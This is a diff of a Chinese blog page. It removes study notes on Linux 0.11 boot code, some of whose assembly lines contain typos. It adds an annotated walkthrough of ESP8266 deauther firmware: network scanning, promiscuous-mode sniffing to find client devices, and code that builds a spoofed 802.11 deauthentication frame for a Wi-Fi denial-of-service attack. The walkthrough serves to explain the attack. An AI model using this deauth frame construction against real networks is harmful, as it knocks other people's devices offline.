+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#scan.cpp</span></span><br><span class="line">	<span class="comment">/* AP Scan */</span></span><br><span class="line">    <span class="keyword">if</span> ((mode == SCAN_MODE_APS) || (mode == SCAN_MODE_ALL)) &#123;</span><br><span class="line">        <span class="comment">// remove old results</span></span><br><span class="line">        accesspoints.removeAll();</span><br><span class="line">        stations.removeAll();</span><br><span class="line">        <span class="comment">// start AP scan</span></span><br><span class="line">        prntln(SC_START_AP);</span><br><span class="line">        WiFi.scanNetworks(<span class="literal">true</span>, <span class="literal">true</span>);</span><br><span class="line">        <span class="comment">/*该函数可以扫描到ESP8266开发板所在环境中的可用WIFI网络，并且将WiFi网络信息保存到内存中。通过调用SSID、RSSI等函数，我们还可以得到这些扫描到的WIFI的更多信息。*/</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
 
-<p><img src="3.png"></p>
-<ul>
-<li>0x13是BIOS读磁盘扇区的中断：<ul>
-<li>ah=0x02    读磁盘</li>
-<li>al=扇区数量（SETUPLEN=4）</li>
-<li>ch=柱面号</li>
-<li>cl=开始扇区（0x02，第二个扇区，因为第一个扇区boot扇区）</li>
-<li>dh=磁头号</li>
-<li>dl=驱动器号</li>
-<li>es（0x9000）:bx（0x0200）=内存地址(0x90200)</li>
-</ul>
-</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ok_load_setup:	//载入setup模块</span><br><span class="line">	mov dl,#0x00</span><br><span class="line">	mov ax,#0x0800</span><br><span class="line">	//ah=0x08获得磁盘参数</span><br><span class="line">	int 0x13</span><br><span class="line">	mov ch，#0x00</span><br><span class="line">	mov sectors，cx</span><br><span class="line">	//保存每磁道扇区数</span><br><span class="line">	mov ah，#0x03</span><br><span class="line">	//读光标位置</span><br><span class="line">	xor bh,bh</span><br><span class="line">	int 0x10</span><br><span class="line">	mov cx,#24</span><br><span class="line">	//要显示24个字符</span><br><span class="line">	mov bx,#0x0007</span><br><span class="line">	//7是显示属性</span><br><span class="line">	</span><br><span class="line">	mov bp，#msg1</span><br><span class="line">	mov ax，#1301</span><br><span class="line">	int 0x10	//显示字符</span><br><span class="line">	//将msg1的字符显示到光标位置</span><br><span class="line">	/*</span><br><span class="line">	bootsect.s中的数据，在文件末尾</span><br><span class="line">	.sectors: .word 0	//磁道扇区数</span><br><span class="line">	msg1:.byte 13,10</span><br><span class="line">		 .ascii &quot;Loading system...&quot;</span><br><span class="line">		 .byte 13,10,13,10</span><br><span class="line">	*/</span><br><span class="line">	mov    ax,#SYSSEG    </span><br><span class="line">	//内核代码被加载到的地址</span><br><span class="line">	mov es,ax</span><br><span class="line">	call read_it	//读入system模块</span><br><span class="line">	jumpi 0，SETUPSEG</span><br><span class="line">	//转入0x9020 : 0x0000执行setup.s</span><br><span class="line">read_it:</span><br><span class="line">	mov ax,es</span><br><span class="line">	cmp ax,#ENDSEG</span><br><span class="line">	//system模块很大，要跨越磁道！</span><br><span class="line">	//ENDSEG=SYSSEG+SYSSIZE</span><br><span class="line">	//SYSSIZE=0x8000(该变量可根据Image大小设定)</span><br><span class="line">	jb ok1_read</span><br><span class="line">	ret</span><br><span class="line">ok1_read:</span><br><span class="line">	mov ax,sectors</span><br><span class="line">	sub ax,sread	//sread是当前磁道已读扇区数，ax未读扇区数</span><br><span class="line">	call read_track	//读磁道...</span><br></pre></td></tr></table></figure>
+<p>​    station模式开启后可以开启混杂模式（混杂模式（英语：promiscuous mode）是电脑网络中的术语。是指一台机器的网卡能够接收所有经过它的数据流，而不论其目的地址是否是它。），从而为嗅探作准备</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#scan.cpp</span></span><br><span class="line"><span class="comment">/* Station Scan */</span></span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (mode == SCAN_MODE_STATIONS) &#123;</span><br><span class="line">        <span class="comment">// start station scan</span></span><br><span class="line">        <span class="keyword">if</span> (accesspoints.count() &lt; <span class="number">1</span>) &#123;</span><br><span class="line">            start(SCAN_MODE_ALL);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;<span class="comment">//如果当前网络没有AP,返回重新扫描，因为我们需要先确定攻击的AP再确定攻击的设备，如果在嗅探前AP已经不存在了，则没有继续的必要</span></span><br><span class="line">        snifferStartTime = currentTime;</span><br><span class="line">        prnt(SC_START_CLIENT);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (sniffTime &gt; <span class="number">0</span>) prnt(String(sniffTime / <span class="number">1000</span>) + S);</span><br><span class="line">        <span class="keyword">else</span> prnt(SC_INFINITELY);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!channelHop) &#123;</span><br><span class="line">            prnt(SC_ON_CHANNEL);</span><br><span class="line">            prnt(wifi_channel);</span><br><span class="line">        &#125;</span><br><span class="line">        prntln();</span><br><span class="line">        wifi::stopAP();</span><br><span class="line">        wifi_promiscuous_enable(<span class="literal">true</span>);<span class="comment">//开启混杂模式</span></span><br><span class="line">    	<span class="comment">/*混杂模式就是接收所有经过网卡的数据包，包括不是发给本机的包。默认情况下网卡只把发给本机的包（包括广播包）传递给上层程序，其它的包一律丢弃。但是混杂模式就是指网卡能接受所有通过它的数据流，不管是什么格式，什么地址的。事实上，计算机收到数据包后，由网络层进行判断（这里是802.11系协议），确定是递交上层（传输层），还是丢弃，还是递交下层（数据链路层、MAC子层）转发。*/</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
 
-<p>引导扇区的末尾//BIOS用以识别引导扇区</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.org 510</span><br><span class="line">	.word 0xAA55 //扇区的最后两个字节</span><br></pre></td></tr></table></figure>
+<p>进入嗅探模式：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Scan::sniffer</span><span class="params">(<span class="keyword">uint8_t</span>* buf, <span class="keyword">uint16_t</span> len)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!isSniffing()) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    packets++;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (len &lt; <span class="number">28</span>) <span class="keyword">return</span>;  <span class="comment">// 丢弃掉过短的数据包</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((buf[<span class="number">12</span>] == <span class="number">0xc0</span>) || (buf[<span class="number">12</span>] == <span class="number">0xa0</span>)) &#123;</span><br><span class="line">        tmpDeauths++;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 丢弃信标帧、探测请求/响应和解除授权/解除关联帧</span></span><br><span class="line">    <span class="keyword">if</span> ((buf[<span class="number">12</span>] == <span class="number">0x80</span>) || (buf[<span class="number">12</span>] == <span class="number">0x40</span>) || (buf[<span class="number">12</span>] == <span class="number">0x50</span>) <span class="comment">/* || buf[12] == 0xc0 || buf[12] == 0xa0*/</span>) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 只允许数据帧</span></span><br><span class="line">    <span class="comment">// if(buf[12] != 0x08 &amp;&amp; buf[12] != 0x88) return;数据帧12位为08和88的时候说明是数据帧，如果都不是，可以丢弃，但作者将这句话注释了，不知道原因。。。</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint8_t</span>* macTo   = &amp;buf[<span class="number">16</span>];<span class="comment">//该数据包要去哪</span></span><br><span class="line">    <span class="keyword">uint8_t</span>* macFrom = &amp;buf[<span class="number">22</span>];<span class="comment">//该数据包从哪来</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (macBroadcast(macTo) || macBroadcast(macFrom) || !macValid(macTo) || !macValid(macFrom) || macMulticast(macTo) ||</span><br><span class="line">        macMulticast(macFrom)) <span class="keyword">return</span>;</span><br><span class="line">	<span class="comment">//Broadcast所谓广播地址指同时向网上所有的主机发送报文，也就是说，不管物理网络特性如何，internet网都支持广播传输。这里表示如果收发地址为广播地址，则丢弃。</span></span><br><span class="line">    <span class="comment">//Multicast是一个群组传播模式。。。其他的看不懂了，和上面区别不大。也丢弃。</span></span><br><span class="line">    <span class="comment">//上面两种的特点都是一对多模式，而我们只需要要截获一对一的数据包，并认为该mac为有效mac地址。</span></span><br><span class="line">    <span class="keyword">int</span> accesspointNum = findAccesspoint(macFrom);<span class="comment">//查看该mac地址有几个AP。这个如果小于0说明该mac地址是连接AP的设备</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (accesspointNum &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">        stations.add(macTo, accesspoints.getID(accesspointNum));</span><br><span class="line">        <span class="comment">//macForm为AP了，那么macTo肯定为设备，我们将该设备的mac加入列表。</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;  <span class="comment">//如果AP数量为0，那么macTo是AP，macForm为设备，</span></span><br><span class="line">        accesspointNum = findAccesspoint(macTo);</span><br><span class="line">        <span class="comment">//这两个if判断谁是AP谁是设备，写的很垃圾</span></span><br><span class="line">        <span class="keyword">if</span> (accesspointNum &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">            stations.add(macFrom, accesspoints.getID(accesspointNum));</span><br><span class="line">            <span class="comment">//我们将该设备的mac加入列表。</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p>可以转入setup执行了，jmpi 0，SETUPSEG</p>
-<h2 id="操作系统启动"><a href="#操作系统启动" class="headerlink" title="操作系统启动"></a>操作系统启动</h2><h3 id="setup模块，即setup-s"><a href="#setup模块，即setup-s" class="headerlink" title="setup模块，即setup.s"></a>setup模块，即setup.s</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">start:</span><br><span class="line">	mov ax,#INITSEG</span><br><span class="line">	mov ds,ax</span><br><span class="line">	mov ah,#0x03</span><br><span class="line">	//获取光标位置</span><br><span class="line">	xor bh,bh</span><br><span class="line">	//bh=页号=0（输入）</span><br><span class="line">	int 0x10</span><br><span class="line">	//输出： DH=行号，DL=列号</span><br><span class="line">	mov [0],dx</span><br><span class="line">	mov ah,#0x88</span><br><span class="line">	int 0x15</span><br><span class="line">	//获取内存大小</span><br><span class="line">	mov [2],ax</span><br><span class="line">	cli	//不允许中断</span><br><span class="line">	mov ah,#0x0000</span><br><span class="line">	//保存光标的行号和列号到 0x90000，共占2字节</span><br><span class="line">	cld</span><br><span class="line">do_move:</span><br><span class="line">	mov es,ax</span><br><span class="line">	add ax,#0x1000</span><br><span class="line">	cmp ax,#0x9000</span><br><span class="line">	jz	end_move</span><br><span class="line">	mov	ds,ax</span><br><span class="line">	sub	di,di</span><br><span class="line">	sub si,si</span><br><span class="line">	mov	cx,#0x8000</span><br><span class="line">	rep</span><br><span class="line">	movsw</span><br><span class="line">	jmp	do_move</span><br></pre></td></tr></table></figure>
+<h2 id="802-11协议"><a href="#802-11协议" class="headerlink" title="802.11协议"></a>802.11协议</h2><img src="/2021/12/07/%E6%97%A0%E7%BA%BFDOS%E4%B9%8B%E5%8F%96%E6%B6%88%E9%AA%8C%E8%AF%81%E6%B4%AA%E6%B0%B4%E6%94%BB%E5%87%BB/7.png" class="">
 
-<p><img src="4.png"></p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">do_move的C翻译:</span><br><span class="line"></span><br><span class="line">ax = <span class="number">0</span>;</span><br><span class="line">cld;</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">    es = ax;</span><br><span class="line">    ax += <span class="number">0x1000</span>;</span><br><span class="line">    <span class="keyword">if</span>(ax == <span class="number">0x9000</span>)</span><br><span class="line">        <span class="keyword">break</span>;  <span class="comment">//结束移动</span></span><br><span class="line">    ds = ax;</span><br><span class="line">    di = si = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">0x8000</span>; ++i)&#123;</span><br><span class="line">       <span class="built_in">memcpy</span>(es:di, ds:si, <span class="number">2</span>);</span><br><span class="line">       di += <span class="number">2</span>;</span><br><span class="line">       si += <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>以上是我们需要构造的mac帧头格式</p>
+<img src="/2021/12/07/%E6%97%A0%E7%BA%BFDOS%E4%B9%8B%E5%8F%96%E6%B6%88%E9%AA%8C%E8%AF%81%E6%B4%AA%E6%B0%B4%E6%94%BB%E5%87%BB/8.png" class="">
 
-<h3 id="保护模式下的地址翻译和中断处理"><a href="#保护模式下的地址翻译和中断处理" class="headerlink" title="保护模式下的地址翻译和中断处理"></a>保护模式下的地址翻译和中断处理</h3><ul>
-<li><p>保护模式下的地址翻译</p>
-<p>即gdt（全局描述符表）的作用：</p>
-<p>t是table，所以实模式下:cs左移4+ip。保护模式下：根据cs查表+ip。cs这里被称为选择子。</p>
-<p><img src="5.png"></p>
-</li>
-<li><p>保护模式下中断函数入口</p>
-<p>即idt（中断描述符表）的作用：</p>
-<p>t是table，仿照gdt，通过int n的n进行查表</p>
-</li>
-</ul>
-<p><img src="6.png"></p>
-<h3 id="将setup移到0地址处"><a href="#将setup移到0地址处" class="headerlink" title="将setup移到0地址处"></a>将setup移到0地址处</h3><ul>
-<li>但0地址处是有重要内容的<ul>
-<li>此处存储的是中断向量表</li>
-</ul>
-</li>
-<li>以后不调用int指令了吗？</li>
-<li>因为操作系统要让硬件进入保护模式了</li>
-<li>保护模式下int n和cs：ip的解释不再和实模式一样</li>
-</ul>
-<p>我们需要初始化这些表</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">end_move:</span><br><span class="line">	mov ax,#SETUPSEG</span><br><span class="line">	mov ds,ax</span><br><span class="line">	lidt idt_48</span><br><span class="line">	lgdt gdt_48</span><br><span class="line">	//设置保护模式下的中断和寻址</span><br><span class="line">idt_48:</span><br><span class="line">	.word 0</span><br><span class="line">	.word 0,0	//保护模式中断函数表</span><br><span class="line">gdt_48:</span><br><span class="line">	.word 0x800</span><br><span class="line">	.word 512+gdt,0x9</span><br><span class="line">gdt:</span><br><span class="line">	.word 0,0,0,0</span><br><span class="line">	.word 0x07FF,0x0000,9x9A00,0x00C0</span><br><span class="line">	.word 0x07FF,0x0000,9x9200,0x00C0</span><br></pre></td></tr></table></figure>
+<p>准确的说，我们需要向设备发送取消验证包。地址1应该是DA（设备mac），地址2是BSSID（伪造成APmac），地址3源地址（还是APmac）</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#attack.cpp</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">Attack::deauthDevice</span><span class="params">(<span class="keyword">uint8_t</span>* apMac, <span class="keyword">uint8_t</span>* stMac, <span class="keyword">uint8_t</span> reason, <span class="keyword">uint8_t</span> ch)</span> </span>&#123;</span><br><span class="line">	······</span><br><span class="line">    <span class="comment">// build deauth packet</span></span><br><span class="line">    packetSize = <span class="keyword">sizeof</span>(deauthPacket);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint8_t</span> deauthpkt[packetSize];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(deauthpkt, deauthPacket, packetSize);<span class="comment">//构造mac帧头，初始数据见下</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;deauthpkt[<span class="number">4</span>], stMac, <span class="number">6</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;deauthpkt[<span class="number">10</span>], apMac, <span class="number">6</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;deauthpkt[<span class="number">16</span>], apMac, <span class="number">6</span>);</span><br><span class="line">    deauthpkt[<span class="number">24</span>] = reason;</span><br><span class="line">    ······</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#attack.h</span></span><br><span class="line"><span class="keyword">uint8_t</span> deauthPacket[<span class="number">26</span>] = &#123;</span><br><span class="line">            <span class="comment">/*  0 - 1  */</span> <span class="number">0xC0</span>, <span class="number">0x00</span>,</span><br><span class="line">            <span class="comment">/*  2 - 3  */</span> <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">            <span class="comment">/*  4 - 9  */</span> <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>,</span><br><span class="line">            <span class="comment">/* 10 - 15 */</span> <span class="number">0xCC</span>, <span class="number">0xCC</span>, <span class="number">0xCC</span>, <span class="number">0xCC</span>, <span class="number">0xCC</span>, <span class="number">0xCC</span>,</span><br><span class="line">            <span class="comment">/* 16 - 21 */</span> <span class="number">0xCC</span>, <span class="number">0xCC</span>, <span class="number">0xCC</span>, <span class="number">0xCC</span>, <span class="number">0xCC</span>, <span class="number">0xCC</span>,</span><br><span class="line">            <span class="comment">/* 22 - 23 */</span> <span class="number">0x00</span>, <span class="number">0x00</span>,                         </span><br><span class="line">            <span class="comment">/* 24 - 25 */</span> <span class="number">0x01</span>, <span class="number">0x00</span>                         </span><br><span class="line">        &#125;;</span><br></pre></td></tr></table></figure>
 
-<h3 id="进入保护模式"><a href="#进入保护模式" class="headerlink" title="进入保护模式"></a>进入保护模式</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">	call empty_8042</span><br><span class="line">//8042是键盘控制器，</span><br><span class="line">	mov	al,#0xD1</span><br><span class="line">	out #0x64,al</span><br><span class="line">	call empty_8042</span><br><span class="line">	mov al,#0xDF</span><br><span class="line">	out #0x60,al</span><br><span class="line">	call empty_8042</span><br><span class="line">	mov ax,#0x0001</span><br><span class="line">	mov cr0,ax</span><br><span class="line">	//cr0寄存器中PE=1启动保护模式，PG=1启动分页</span><br><span class="line">	jmpi 0,8</span><br></pre></td></tr></table></figure>
-
-<p><img src="7.png"></p>
-<p><img src="8.png"></p>
-<p><img src="9.png"></p>
-<h3 id="跳到system模块执行"><a href="#跳到system模块执行" class="headerlink" title="跳到system模块执行"></a>跳到system模块执行</h3><p>system模块（目标代码）中的第一部分代码：head.s</p>
-<p>system由许多文件编译而成，第一个就是head.s</p>
-<p><img src="s49.png"></p>
-<h3 id="head-s-一段在保护模式下运行的代码"><a href="#head-s-一段在保护模式下运行的代码" class="headerlink" title="head.s//一段在保护模式下运行的代码"></a>head.s//一段在保护模式下运行的代码</h3><ul>
-<li>setup是进入保护模式，head是进入之后的初始化</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">stratup_32:</span><br><span class="line">	movl $0x10,%eax</span><br><span class="line">	mov %ax,%ds</span><br><span class="line">	mov %ax,%es</span><br><span class="line">	</span><br><span class="line">	mov	%as,%fs</span><br><span class="line">	mov	%as,%gs</span><br><span class="line">	//指向gdt的0x10项(数据段)</span><br><span class="line">	</span><br><span class="line">	lss _start,%esp//设置栈(系统栈)</span><br><span class="line">	call setup_idt</span><br><span class="line">	call setup_gdt</span><br><span class="line">	//设置q和GDT</span><br><span class="line">	xorl %eax,%eax</span><br><span class="line">l:</span><br><span class="line">	incl %eax</span><br><span class="line">	movl %eax,0x000000</span><br><span class="line">	cmpl %eax,0x100000</span><br><span class="line">	je 1b	//0地址和1M地址处相同（A20没开启），就死循环</span><br><span class="line">	//检测A20开启否</span><br><span class="line">	jmp	after_page_tables//页表</span><br><span class="line">setup_idt:</span><br><span class="line">	lea ignore_int,%edx</span><br><span class="line">	movl $0x00080000,%eax</span><br><span class="line">	movw %dx,%ax</span><br><span class="line">	lea _idt,%edi</span><br><span class="line">	movl %eax,(%edi)</span><br></pre></td></tr></table></figure>
-
-<h3 id="关于汇编…head-s的汇编和之前不一样？"><a href="#关于汇编…head-s的汇编和之前不一样？" class="headerlink" title="关于汇编…head.s的汇编和之前不一样？"></a>关于汇编…head.s的汇编和之前不一样？</h3><ol>
-<li><p>as86汇编：能产生16位代码的Intel 8086汇编</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov ax,cs	//cs-&gt;ax，目标操作数在前</span><br></pre></td></tr></table></figure></li>
-<li><p>GNU as汇编：产生32位代码，使用AT&amp;T语法</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">movl var,%eax	//（var）—&gt;%eax</span><br><span class="line">movb -4(%ebp),%al	//取出一字节</span><br></pre></td></tr></table></figure></li>
-<li><p>内敛汇编，gcc编译x.c会产生中间结果as汇编文件x.s</p>
-</li>
-</ol>
-<p><img src="s50.png"></p>
-<p><img src="s51.png"></p>
-<h3 id="after-page-tables-设置页表之后"><a href="#after-page-tables-设置页表之后" class="headerlink" title="after_page_tables    //设置页表之后"></a>after_page_tables    //设置页表之后</h3><ul>
-<li><p>setup是进入保护模式，head是进入之后的初始化</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">after_page_tables:</span><br><span class="line">	pushl $0</span><br><span class="line">	pushl $0</span><br><span class="line">	pushl $0</span><br><span class="line">	pushl $L6</span><br><span class="line">	//压栈</span><br><span class="line">	pushl $_main//将_main压入栈中</span><br><span class="line">	jmp set_paging</span><br><span class="line">L6:</span><br><span class="line">	jmp	L6//main返回时死循环，死机。</span><br><span class="line">setup_paging: 设置页表 ret</span><br></pre></td></tr></table></figure>
-
-<p>setup_paging执行ret后，会执行main.c。</p>
-<p>从汇编跳到执行C函数，和函数跳转一样。</p>
-</li>
-</ul>
-<p><img src="s52.png"></p>
-<p>三个参数分别为envp,argv,argc，此处都是0。</p>
-<p>此处的main只保留了传统的形式和命名。</p>
-<p>main的工作就是xx_init:内存、中断、设备、时钟、CPU等内容的初始化。</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    mem_init();</span><br><span class="line">    trap_init();</span><br><span class="line">    blk_dev_init();</span><br><span class="line">    chr_dev_init();</span><br><span class="line">    tty_init();</span><br><span class="line">    time_init();</span><br><span class="line">    sched_init();</span><br><span class="line">    buffer_init();</span><br><span class="line">    hd_init();</span><br><span class="line">    floppy_init();</span><br><span class="line">    sti();</span><br><span class="line">    move_to_user_mode();</span><br><span class="line">    <span class="keyword">if</span>(!fork())&#123;init();&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h3 id="看一看mem-init…可以在视图菜单中关闭"><a href="#看一看mem-init…可以在视图菜单中关闭" class="headerlink" title="看一看mem_init…可以在视图菜单中关闭"></a>看一看mem_init…可以在<code>视图</code>菜单中关闭</h3><p>执行内存的初始化。</p>
-<p><img src="s53.png"></p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mem_init</span><span class="params">(<span class="keyword">long</span> start_mem,<span class="keyword">long</span> end_mem)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;PAGING_PAGS;i++)<span class="comment">//操作系统是使用着的</span></span><br><span class="line">        mem_map[i]=USED;</span><br><span class="line">    i=MAP_NR(start_mem);</span><br><span class="line">    end_mem-=start_mem;</span><br><span class="line">    end_mem&gt;&gt;=<span class="number">12</span>;	<span class="comment">//4k</span></span><br><span class="line">    <span class="keyword">while</span>(end_mem --&gt;<span class="number">0</span>)</span><br><span class="line">        mem_map[i++]=<span class="number">0</span>;<span class="comment">//每4k大小的区域放在一起置为0</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h2 id="操作系统接口"><a href="#操作系统接口" class="headerlink" title="操作系统接口"></a>操作系统接口</h2><h3 id="接口（Interface）"><a href="#接口（Interface）" class="headerlink" title="接口（Interface）"></a>接口（Interface）</h3><ul>
-<li>连接两个东西、信号转换、屏蔽细节</li>
-</ul>
-<h4 id="什么是操作系统接口？"><a href="#什么是操作系统接口？" class="headerlink" title="什么是操作系统接口？"></a>什么是操作系统接口？</h4><p>连接上层用户和操作系统软件。</p>
-<h5 id="命令行？"><a href="#命令行？" class="headerlink" title="命令行？"></a>命令行？</h5><p>命令：一段程序，shell也是一段程序。</p>
-<p><img src="10.png"></p>
-<p><img src="11.png"></p>
-<p><img src="12.png"></p>
-<h5 id="图形按钮？"><a href="#图形按钮？" class="headerlink" title="图形按钮？"></a>图形按钮？</h5><ul>
-<li>鼠标点击、键盘按下后</li>
-</ul>
-<p><img src="13.png"></p>
-<p><img src="14.png"></p>
-<p><img src="15.png"></p>
-<h5 id="操作系统接口-1"><a href="#操作系统接口-1" class="headerlink" title="操作系统接口"></a>操作系统接口</h5><p>通过C语言程序，连接操作系统和应用软件。</p>
-<p>接口表现为函数调用，又由系统提供，所以称为系统调用。</p>
-<h3 id="系统调用"><a href="#系统调用" class="headerlink" title="系统调用"></a>系统调用</h3><ul>
-<li>POSIX：Portable Operating System Interface of Unix（IEEE制定的一个标准族）</li>
-</ul>
-<p><img src="16.png"></p>
-<h2 id="系统调用的实现"><a href="#系统调用的实现" class="headerlink" title="系统调用的实现"></a>系统调用的实现</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">main()&#123;whoami();&#125;</span><br><span class="line">whoami()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="number">100</span>,<span class="number">8</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="number">100</span>:<span class="string">&quot;lizhijun&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>应用程序为什么不能直接jmp到操作系统中执行函数？</p>
-<p>不允许，会有安全问题。</p>
-<h3 id="内核（用户）态，内核（用户）段"><a href="#内核（用户）态，内核（用户）段" class="headerlink" title="内核（用户）态，内核（用户）段"></a>内核（用户）态，内核（用户）段</h3><ul>
-<li><p>将内核程序和用户程序隔离</p>
-<ul>
-<li><p>区分内核态和用户态：通过一种处理器的硬件设计。</p>
-<img src="17.png"></li>
-<li><p><img src="18.png"></p>
-</li>
-<li><p>DPL用于描述目标内存段的特权级别（GDT中），CPL（当前的特权级，取决于执行的指令）</p>
-</li>
-</ul>
-</li>
-</ul>
-<h3 id="硬件提供了“主动进入内核的唯一方法”"><a href="#硬件提供了“主动进入内核的唯一方法”" class="headerlink" title="硬件提供了“主动进入内核的唯一方法”"></a>硬件提供了“主动进入内核的唯一方法”</h3><ul>
-<li>int指令将使CS中的CPL改为0，“进入内核”</li>
-<li>这是用户程序发起调用内核代码的唯一方式</li>
-<li>系统调用的核心：<ol>
-<li>用户程序中包含一段包含int指令的代码</li>
-<li>操作系统写中断处理，获取想调程序的编号</li>
-<li>操作系统根据编号执行相应代码</li>
-</ol>
-</li>
-</ul>
-<h3 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h3><p><img src="19.png"></p>
-<ul>
-<li><p>最终展开成包含int指令的代码… </p>
-<p><img src="20.png"></p>
-</li>
-</ul>
-<h3 id="Write实现"><a href="#Write实现" class="headerlink" title="Write实现"></a>Write实现</h3><p><img src="21.png"></p>
-<p>先int 0x80，调用0x80号中断，再把_NR_write(4)赋给eax，eax又赋给了__res作为返回值。最后把a赋给ebx，把b赋给ecx,把c赋给edx。</p>
-<p>NR_write是系统调用号，放在eax中。</p>
-<p><img src="22.png"></p>
-<h3 id="int-0x80中断的处理"><a href="#int-0x80中断的处理" class="headerlink" title="int 0x80中断的处理"></a>int 0x80中断的处理</h3><p>通过IDT表来找到中断处理函数。</p>
-<ul>
-<li>显然，set_system_gate用来设置0x80的中断处理</li>
-</ul>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sched_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;	set_system_gate(<span class="number">0x80</span>,&amp;system_call)&#125;<span class="comment">//中断处理门</span></span><br><span class="line"><span class="comment">//遇到0x80中断，就跳到system_call的中断处理函数</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> set_system_gate(n,addr)	<span class="comment">//第n号中断对应处理函数入口点偏移地址addr</span></span></span><br><span class="line">_set_gate(&amp;idt[n],<span class="number">15</span>,<span class="number">3</span>,addr);<span class="comment">//idt是中断向量表基址</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _set_gate(gate_addr, type, dpl, addr)</span></span><br><span class="line">_asm_(</span><br><span class="line">    <span class="string">&quot;movw %%dx,%%ax\n\t&quot;</span> <span class="string">&quot;movw %0,%%dx\n\t&quot;</span></span><br><span class="line">    <span class="string">&quot;movl %%eax, %1\n\t&quot;</span> <span class="string">&quot;movl %%edx, %2&quot;</span>:</span><br><span class="line">     :<span class="string">&quot;i&quot;</span>((<span class="keyword">short</span>)(<span class="number">0x8000</span>+(dpl&lt;&lt;<span class="number">13</span>)+type&lt;&lt;<span class="number">8</span>))</span><br><span class="line">	),<span class="string">&quot;o&quot;</span>(*((<span class="keyword">char</span>*)(gate_addr))),</span><br><span class="line">	<span class="string">&quot;o&quot;</span>(*(<span class="number">4</span>+(<span class="keyword">char</span>*)(gate_addr))),</span><br><span class="line">	<span class="string">&quot;d&quot;</span>((<span class="keyword">char</span>*)(addr),<span class="string">&quot;a&quot;</span>(<span class="number">0x00080000</span>))</span><br></pre></td></tr></table></figure>
-
-<p><img src="23.png"></p>
-<p>段选择符0x8000,处理函数入口点偏移&amp;system_call。</p>
-<p>cs=8，ip=&amp;system_call</p>
-<p>cpl是cs最后两位，cpl=00</p>
